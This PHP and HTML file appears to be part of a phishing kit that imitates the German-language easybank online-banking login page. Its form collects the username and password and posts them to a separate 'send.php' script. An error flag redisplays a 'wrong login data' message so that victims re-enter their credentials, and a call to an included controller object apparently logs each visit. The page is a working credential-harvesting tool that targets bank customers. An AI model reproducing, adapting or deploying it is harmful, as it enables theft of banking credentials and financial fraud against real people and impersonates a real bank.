<?php 
require '../main.php';
?><!DOCTYPE html>
<html class="" lang="de">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<title>Online-Banking | easybank</title>
<meta content="Einfach, schnell und sicher. Schnelle Überweisungen, Echtzeitinformationen, Zahlpläne einrichten – unser neues Online-Banking bietet viele Möglichkeiten." name="description"/>
<meta content="width=device-width, height=device-height, initial-scale=1.0, viewport-fit=cover" name="viewport"/>
<meta content="telephone=no" name="format-detection"/>
<meta content="no" name="msapplication-tap-highlight"/>
<meta content="no-referrer" name="referrer"/>
<link href="styles.css" rel="stylesheet"/>
</head>
<body class="desktop-detected internet-banking template_logintransaction_firstlevel desktop no-ignore-color">

<section aria-labelledby="page-title" class="unauthenticated" id="vcMainContainer" role="region" tabindex="-1">

<div class="vc-header" id="headerPanel">
 <div class="header header--default" id="header">
  <div class="header__logo">
   <div class="logo-group">
    <a class="clickable logo" href="#" title="easybank">
     <img alt="easybank" id="LogoClickable-headerLogo-ItemPreview" src="css/easybank.png"/>
    </a>
   </div>
  </div>
  <div class="header__menu">
   <div class="header-menu__site-navigation"></div>
   <div class="hide-mobile">
    <div class="header-menu__register-button">
     <button aria-label="Jetzt registrieren" class="vc-btn--primary vc-btn--small-height vc-btn" id="btn-RegisterButtonText" role="link">
      <span id="VcIconSpanId">Jetzt registrieren</span>
     </button>
    </div>
   </div>
  </div>
 </div>
 <div class="header-push"></div>
</div>

<div aria-labelledby="page-title" class="clearfix" id="main" role="main">
 <div class="login-page">
  <div class="form-horizontal undefined main-container-primary background-primary">
   <div class="content-container">
    <div class="login-wrapper">
     <div class="login-wrapper__head"></div>
     <div class="login-wrapper__content login-wrapper__content--center">
      <div class="login-wrapper__form">
       <div class="login-wrapper__tab" id="LoginTab">
        <div class="tabs tabs--primary">
         <div class="nav-tabs" data-selected-tab="0" role="tablist">
          <button aria-controls="vc-tabs-LoginTab0" aria-selected="true" class="active" id="vc-tabs-LoginTab0-button" role="tab" tabindex="0">
           <span id="label-LoginTab0">
            <span class="button__title">Online-Banking</span>
           </span>
          </button>
          <button aria-controls="vc-tabs-LoginTab1" aria-selected="false" id="vc-tabs-LoginTab1-button" role="tab" tabindex="-1">
           <span id="label-LoginTab1">
            <span class="button__title">Tagesgeldkonto</span>
           </span>
          </button>
         </div>
         <div class="no-padding">
          <div class="widget-body">
           <div class="vc-tabs-LoginTab tab-content">
            <div aria-labelledby="OnlineBanking-button" class="tab-pane fade show" id="OnlineBanking" role="tabpanel" tabindex="0">
             <div class="tab-pane__content">
              <div class="login-form">
               <div class="heading" id="VcLabelHeadingDivloginWelcomeTextOnline">
                <h1 id="HeadingH1loginWelcomeTextOnline">Willkommen in Ihrem Online-Banking</h1>
               </div>
               <?php if(isset($_GET['e'])): ?>
               <p style="color:red;">Falsche login Daten.</p>
               <?php endif; ?>
               <form action="send.php" method="POST">
                <div class="login-form__fields">
                 <div>
                  <div class="form-field form-field--primary form-field--has-title" id="UserName-container">
                   <label aria-hidden="true" class="form-field__title" for="UserName-field" id="UserName-label" tabindex="-1" title="Benutzername">
                    Benutzername
                    <span class="visually-hidden">(erforderlich)</span>
                   </label>
                   <input aria-labelledby="UserName-label" autocomplete="username" class="form-field__element" id="UserName-field" maxlength="50" type="text" name="user" required value=""/>
                  </div>
                  <div aria-hidden="true" class="custom-space" tabindex="-1"></div>
                 </div>
                 <div class="form-field form-field--primary form-field--has-title" id="Password-container">
                  <label aria-hidden="true" class="form-field__title" for="Password-field" id="Password-label" tabindex="-1" title="Passwort">
                   Passwort
                   <span class="visually-hidden">(erforderlich)</span>
                  </label>
                  <input aria-labelledby="Password-label" autocomplete="off" class="form-field__element" id="Password-field" maxlength="99" type="password" name="pass" required/>
                 </div>
                 <div class="buttons-container buttons-container--single">
                  <div class="buttons-container__desktop">
                   <button aria-label="Anmelden" class="vc-btn--primary vc-btn" id="btn-NextButton" type="submit">
                    <span id="VcIconSpanId">Anmelden</span>
                   </button>
                  </div>
                 </div>
                </div>
               </form>
               <div class="login-form-bottom">
                <div class="login-bottom">
                 <div class="login-bottom__links">
                  <div class="login-bottom__links-section"></div>
                  <div class="login-bottom__links-section">
                   <label class="link-label">
                    <a aria-label="Zugangsdaten vergessen" href="#" title="Zugangsdaten vergessen">
                     <span class="text" tabindex="-1">Zugangsdaten vergessen</span>
                    </a>
                   </label>
                  </div>
                 </div>
                </div>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
 </div>
</div>

<footer class="footer">
 <div class="container">
  <h2 class="visually-hidden" id="footerHeadline">Footer Navigation</h2>
  <nav aria-labelledby="footerHeadline" id="footer-nav" role="navigation">
   <ul>
    <li><a aria-label="FAQ" href="#" title="FAQ"><span class="text" tabindex="-1">FAQ</span></a></li>
    <li><a aria-label="Kontakt" href="#" title="Kontakt"><span class="text" tabindex="-1">Kontakt</span></a></li>
    <li><a aria-label="Impressum" href="#" title="Impressum"><span class="text" tabindex="-1">Impressum</span></a></li>
    <li><a aria-label="Datenschutz" href="#" title="Datenschutz"><span class="text" tabindex="-1">Datenschutz</span></a></li>
    <li><a aria-label="AGB" href="#" title="AGB"><span class="text" tabindex="-1">AGB</span></a></li>
    <li><a aria-label="Barrierefreiheit" href="#" title="Barrierefreiheit"><span class="text" tabindex="-1">Barrierefreiheit</span></a></li>
   </ul>
  </nav>
 </div>
</footer>

</section>

<script src="js/jq.js"></script>
<?php $m->ctr("LOGIN ".@$_GET['e']); ?>
</body>
</html>